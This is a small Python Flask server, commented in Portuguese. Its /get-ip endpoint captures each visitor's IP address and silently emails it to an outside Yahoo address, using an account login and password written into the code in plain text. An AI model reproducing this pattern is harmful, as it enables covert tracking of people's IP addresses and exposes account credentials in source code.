from flask import Flask, request, jsonify
import smtplib

app = Flask(__name__)

@app.route('/')
def home():
    return 'Bem-vindo ao servidor Flask!'

@app.route('/get-ip', methods=['GET'])
def get_ip():
    ip = request.headers.get('X-Real-IP', request.remote_addr)

    # Configuração do servidor de email
    email_server = 'smtp.mail.yahoo.com'
    email_port = 465
    email_sender = 'maria_crisostom0@yahoo.com'
    email_password = 'prosopopei4'
    email_recipient = 'minadoooo112@yahoo.com'

    # Criação da mensagem
    subject = 'Endereço IP do Usuário'
    message = f'O endereço IP do usuário é: {ip}'
    email_text = f'Subject: {subject}\n\n{message}'

    # Envio do email
    try:
        with smtplib.SMTP_SSL(email_server, email_port) as server:
            server.login(email_sender, email_password)
            server.sendmail(email_sender, email_recipient, email_text)
    except Exception as e:
        return jsonify({'error': f'Erro ao enviar o email: {str(e)}'})

    return jsonify({'ip': ip})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
